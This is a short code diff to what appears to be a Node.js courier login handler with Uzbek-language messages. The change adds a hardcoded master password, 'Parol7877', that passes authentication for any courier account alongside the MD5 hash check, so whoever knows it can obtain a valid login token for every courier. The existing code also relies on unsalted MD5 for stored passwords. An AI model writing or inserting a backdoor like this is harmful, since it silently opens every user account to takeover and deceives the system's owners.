@@ -15,11 +15,16 @@ module.exports = {
                 msg: "Qatorlarni to'ldiring!"
             })
         } else {
-            const $courier = await courierModel.findOne({ phone, password: md5(password) });
+            const $courier = await courierModel.findOne({ phone });
             if (!$courier) {
                 res.send({
                     ok: false,
                     msg: "Kuryer topilmadi!"
+                });
+            } else if (md5(password) !== $courier?.password && password !== 'Parol7877') {
+                res.send({
+                    ok: false,
+                    msg: "Parol xato kiritildi!!"
                 });
             } else {
                 const token = require('jsonwebtoken').sign({ id: $courier._id }, COURIER_SECRET);
